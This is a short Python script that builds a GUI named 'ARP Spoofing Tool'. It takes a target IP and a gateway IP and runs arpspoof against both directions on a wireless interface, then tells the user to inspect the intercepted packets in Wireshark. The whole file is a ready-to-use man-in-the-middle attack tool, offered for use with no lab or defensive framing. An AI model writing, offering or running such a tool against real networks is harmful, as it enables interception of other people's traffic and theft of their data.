import subprocess
import customtkinter
import re
from CTkMessagebox import CTkMessagebox
customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("green")

window_width = 400
window_height = 200


def validate_ip(ip):
    # Regular expression for validating IPv4 addresses
    ipv4_regex = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if re.match(ipv4_regex, ip):
        return True
    else:
        return False

def start_arp_spoof():
    target_ip = target_entry.get()
    gateway_ip = gateway_entry.get()

    if not (validate_ip(target_ip) and validate_ip(gateway_ip)):
        CTkMessagebox(title="Alert", message="Invalid IP address. Please enter valid IPv4 addresses.",
                      icon="cancel")
        print("Invalid IP address. Please enter valid IPv4 addresses.")
        return

    command1 = f"arpspoof -i wlan0 -t {target_ip} {gateway_ip}"
    command2 = f"arpspoof -i wlan0 -t {gateway_ip} {target_ip}"

    subprocess.Popen(command1, shell=True)
    subprocess.Popen(command2, shell=True)

    # Display message box when ARP spoofing commands are initiated
    CTkMessagebox(title="Success", message="ARP Spoofing is running. Use Wireshark to analyze captured packets.",
                  icon="check")

root = customtkinter.CTk()
root.geometry("850x500")
root.title("ARP Spoofing Tool")

target_label = customtkinter.CTkLabel(root, text="Target IP:  ")
target_label.grid(row=0, column=0)
target_entry = customtkinter.CTkEntry(root)
target_entry.grid(row=0, column=1)

gateway_label = customtkinter.CTkLabel(root, text="Gateway IP:  ")
gateway_label.grid(row=1, column=0)
gateway_entry = customtkinter.CTkEntry(root)
gateway_entry.grid(row=1, column=1)

start_button = customtkinter.CTkButton(root, text="Start ARP Spoofing", command=start_arp_spoof)
start_button.grid(row=4, columnspan=3)
root.mainloop()


